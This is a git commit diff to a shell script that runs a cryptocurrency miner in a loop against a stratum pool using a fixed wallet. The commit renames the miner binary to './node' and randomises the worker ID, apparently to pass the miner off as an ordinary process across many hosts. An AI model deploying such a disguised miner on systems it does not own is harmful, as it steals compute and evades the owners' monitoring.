6aa69f3ef321af23edeb7faed1458b5279984936
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-01-05 03:58:26 +0700

    Update miner-coin.sh

--- miner-coin.sh
+++ miner-coin.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-	./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qZHktc2QXhCBVztbGutoePSi9RtWmTeAsU.rig1 -p webpassword=x
+	./node -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qZHktc2QXhCBVztbGutoePSi9RtWmTeAsU.$(shuf -i 1-99999 -n 1) -p webpassword=x
 	sleep 5
 done
